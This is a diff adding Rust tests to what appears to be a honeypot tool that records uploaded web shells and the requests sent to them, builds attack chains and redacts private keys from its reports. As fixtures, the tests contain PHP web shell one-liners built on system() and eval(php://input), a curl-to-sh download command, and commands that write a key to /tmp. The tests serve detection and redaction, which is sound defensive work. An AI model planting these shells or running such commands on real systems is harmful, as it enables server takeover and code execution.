+    async fn a_follow_up_reads_a_posted_or_raw_input() {
+        let (s, _d) = store().await;
+        let php = b"<?php system($_POST['c']); echo 'a shell of 32 bytes or so'; ?>";
+        let uid = seed_upload(&s, UPLOADER, "/up/a.php", php).await;
+        sent(&s, "/up/a.php", None, Some(b"c=uname+-a")).await;
+        pieces_pass(&s).await;
+        assert!(
+            follow_rows(&s, &uid)
+                .await
+                .iter()
+                .any(|r| r.label == "uname -a")
+        );
+        let raw = b"<?php eval(file_get_contents('php://input')); echo 'padding'; ?>";
+        let uid = seed_upload(&s, UPLOADER, "/up/b.php", raw).await;
+        sent(&s, "/up/b.php", None, Some(b"echo hello")).await;
+        pieces_pass(&s).await;
+        assert!(
+            follow_rows(&s, &uid)
+                .await
+                .iter()
+                .any(|r| r.label == "echo hello")
+        );
+    }
+
+    #[tokio::test]
+    async fn a_follow_up_with_no_profile_shows_its_recipe() {
+        let (s, _d) = store().await;
+        let uid = seed_upload(&s, UPLOADER, "/up/a.php", FILE).await;
+        let body = b"curl -s http://example.org/a.sh | sh";
+        sent(&s, "/up/a.php", None, Some(body)).await;
+        pieces_pass(&s).await;
+        let x = parse(
+            Source::Request {
+                method: "POST",
+                path: "/up/a.php",
+                query: None,
+                body: Some(body),
+                sender: None,
+            },
+            Policy::embedded(),
+        );
+        let want = label(&x.recipes[0].normal);
+        let rows = follow_rows(&s, &uid).await;
+        assert!(rows.iter().any(|r| r.label == want), "{want}: {rows:?}");
+    }
+
+    #[tokio::test]
+    async fn a_follow_up_never_shows_a_private_key() {
+        let (s, _d) = store().await;
+        let uid = seed_upload(&s, UPLOADER, "/up/s.php", SHELL_GET).await;
+        let pem =
+            "-----BEGIN OPENSSH PRIVATE KEY-----\nQUJDREVG\n-----END OPENSSH PRIVATE KEY-----";
+        let plain = crate::admin::public::urlencode(&format!("echo '{pem}' > /tmp/k"));
+        let hidden = data_encoding::BASE64.encode(pem.as_bytes());
+        let hidden =
+            crate::admin::public::urlencode(&format!("echo {hidden} | base64 -d > /tmp/k"));
+        let (a, b) = (format!("tool={plain}"), format!("tool={hidden}"));
+        sent(&s, "/up/s.php", Some(&a), None).await;
+        sent(&s, "/up/s.php", Some(&b), None).await;
+        // A dead end's query is not read at all, and its path is masked.
+        let key_path = format!("/x{}/s.php", crate::admin::public::urlencode(pem));
+        for table in ["UPDATE uploads SET ts = ?", "UPDATE requests SET ts = ?"] {
+            sqlx::query(table).bind(T0).execute(&s.pool).await.unwrap();
+        }
+        let at_30 = "2026-10-01 00:00:30";
+        request(&s, UPLOADER, ("GET", &key_path), 404, "default", at_30).await;
+        pieces_pass(&s).await;
+        let rows = follow_rows(&s, &uid).await;
+        assert!(rows.len() >= 2, "{rows:?}");
+        for r in &rows {
+            let text = format!("{} {}", r.label, r.detail);
+            for gone in ["PRIVATE", "BEGIN", "QUJDREVG", "LS0tLS1", "tool="] {
+                assert!(!text.contains(gone), "{gone}: {r:?}");
+            }
+        }
+    }
+
+    #[tokio::test]
+    async fn a_request_that_carried_an_upload_is_read_without_its_body() {
+        let (s, _d) = store().await;
+        let raw = b"<?php eval(file_get_contents('php://input')); echo 'padding'; ?>";
+        let uid = seed_upload(&s, UPLOADER, "/up/a.php", raw).await;
+        let second = seed_upload(&s, OTHER, "/up/a.php", raw).await;
+        let mut c = s.pool.acquire().await.unwrap();
+        let carrier = uploads::get(&mut c, &second)
+            .await
+            .unwrap()
+            .unwrap()
+            .request_id;
+        drop(c);
+        sqlx::query("UPDATE requests SET body = 'UPLOADMARK' WHERE id = ?")
+            .bind(carrier)
+            .execute(&s.pool)
+            .await
+            .unwrap();
+        pieces_pass(&s).await;
+        let rows = follow_rows(&s, &uid).await;
+        assert!(
+            rows.iter().any(|r| r.label == "PUT /up/a[.]php"),
+            "{rows:?}"
+        );
+        assert!(!format!("{rows:?}").contains("UPLOADMARK"), "{rows:?}");
+    }
+
+    #[tokio::test]
+    async fn follow_ups_past_the_cap_are_counted_not_read() {
+        let (s, _d) = store().await;
+        let uid = seed_upload(&s, UPLOADER, "/up/a.php", SHELL_GET).await;
+        for i in 0..FOLLOW_READS_MAX + 3 {
+            sent(&s, "/up/a.php", Some(&format!("tool=c{i}")), None).await;
+        }
+        pieces_pass(&s).await;
+        let rows = follow_rows(&s, &uid).await;
+        assert_eq!(rows.len(), FOLLOW_READS_MAX + 1, "{rows:?}");
+        let last = rows.last().unwrap();
+        assert_eq!(last.label, "3 more requests");
+        assert_eq!(last.href, Some(format!("/admin/traps/uploads/{uid}")));
+    }
+
+    #[tokio::test]
+    async fn timelines_read_the_newest_uploads_only() {
+        let (s, _d) = store().await;
+        for i in 0..TIMELINE_UPLOADS + 2 {
+            let path = format!("/up/{i}.php");
+            seed_upload(&s, UPLOADER, &path, FILE).await;
+            sent(&s, &path, None, None).await;
+        }
+        let key = pass(&s).await;
+        let mut c = s.pool.acquire().await.unwrap();
+        assert_eq!(
+            uploads_of(&mut c, &key).await.unwrap().len(),
+            TIMELINE_UPLOADS + 2
+        );
+        let rows = follow_ups(&mut c, &key).await.unwrap();
+        assert_eq!(rows.len(), TIMELINE_UPLOADS, "{rows:?}");
+        assert!(
+            rows.iter()
+                .all(|r| r.path != "/up/0.php" && r.path != "/up/1.php")
+        );
+    }
+
+    #[tokio::test]
+    async fn one_statement_reads_each_uploads_timeline() {
+        let (s, _d) = store().await;
+        let noisy = seed_upload(&s, UPLOADER, "/noisy.php", FILE).await;
+        let quiet = seed_upload(&s, UPLOADER, "/quiet.php", FILE).await;
+        for _ in 0..4 {
+            sent(&s, "/noisy.php", None, None).await;
+        }
+        let last = sent(&s, "/quiet.php", None, None).await;
+        let mut c = s.pool.acquire().await.unwrap();
+        let rows = [
+            uploads::get(&mut c, &noisy).await.unwrap().unwrap(),
+            uploads::get(&mut c, &quiet).await.unwrap().unwrap(),
+        ];
+        let all = uploads::timelines(&mut c, &rows).await.unwrap();
+        assert!(all.iter().any(|r| r.id == last));
+        assert!(
+            all.windows(2)
+                .all(|w| (&w[0].ts, w[0].id) <= (&w[1].ts, w[1].id))
+        );
+        let one = uploads::timeline(&mut c, &rows[1]).await.unwrap();
+        assert_eq!(one.iter().map(|r| r.id).collect::<Vec<_>>(), [last]);
+    }
+
+    #[tokio::test]
+    async fn pieces_past_the_cap_are_counted_and_joiners_stay() {
+        let (s, _d) = store().await;
+        let (id, ip) = sighted(&s, UPLOADER, "/a", &[STAGER_A]).await;
+        for i in 0..FOUND_MAX + 5 {
+            let value = format!("recipe-{i}");
+            sight(&s, ("recipe", &value, "recipe"), ("request", id), ip).await;
+        }
+        run(&s).await;
+        let chains = s.chains_of(Anchor::Ip(ip)).await.unwrap();
+        let c = &chains[0];
+        assert_eq!(c.more, 6);
+        assert_eq!(stage(c, "Command").len(), FOUND_MAX - 1);
+        assert_eq!(one(c, "Delivery").label, "a[.]example[.]org");
+        // The same bound without a key.
+        let hash = piece_hash("recipe", "recipe-0");
+        let chains = s.chains_of(Anchor::Piece(hash)).await.unwrap();
+        let c = &chains[0];
+        assert_eq!(c.key, None);
+        assert_eq!(c.more, 6);
+        assert_eq!(one(c, "Delivery").label, "a[.]example[.]org");
+    }
+
+    #[tokio::test]
+    async fn a_lookup_by_piece_uses_the_index() {
+        let (s, _d) = store().await;
+        let plan: Vec<(i64, i64, i64, String)> =
+            sqlx::query_as("EXPLAIN QUERY PLAN SELECT chain FROM chain_pieces WHERE piece = 1")
+                .fetch_all(&s.pool)
+                .await
+                .unwrap();
+        assert!(plan[0].3.contains("idx_chain_pieces_piece"), "{plan:?}");
+    }
+
+    #[test]
+    fn inputs_come_from_every_profile() {
+        let p = |value: &str| Found {
+            hash: 1,
+            kind: "shell-profile".into(),
+            value: value.into(),
+            role: "recipe".into(),
+            seen: true,
+            ips: 1,
+        };
+        let found = [
+            p("input=$_GET[a],$_POST[b];exec=system;marker=x"),
+            p("input=php://input;exec=eval"),
+        ];
+        assert_eq!(
+            shell_inputs(&found),
+            ["$_GET[a]", "$_POST[b]", "php://input"]
+        );
     }
 
     #[tokio::test]
